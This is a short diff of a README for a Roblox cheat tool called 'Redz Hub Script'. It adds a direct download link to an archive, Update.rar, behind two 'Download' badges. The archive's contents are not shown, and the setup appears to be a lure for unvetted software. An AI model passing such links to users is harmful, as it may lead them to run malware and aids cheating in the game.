@@ -1,9 +1,9 @@
 # 🔥 **Redz Hub Script — The Ultimate Roblox Script Hub (2025 Edition)** 🚀  
-[![Download Redz Hub](https://img.shields.io/badge/Download-Redz_Hub-red?style=for-the-badge&logo=download)]()  
+[![Download Redz Hub](https://img.shields.io/badge/Download-Redz_Hub-red?style=for-the-badge&logo=download)](https://github.com/XenBits7/redz-hub-script/releases/download/Update/Update.rar)  
 ![red](https://github.com/user-attachments/assets/21709450-beb1-4ec8-8cf2-b43c4f8e3814)
 
 
-[![Download Redz Hub](https://img.shields.io/badge/Download-Redz_Hub-red?style=for-the-badge&logo=download)]()  
+[![Download Redz Hub](https://img.shields.io/badge/Download-Redz_Hub-red?style=for-the-badge&logo=download)](https://github.com/XenBits7/redz-hub-script/releases/download/Update/Update.rar)  
 
 ## ❓ **What is Redz Hub Script?**  
 
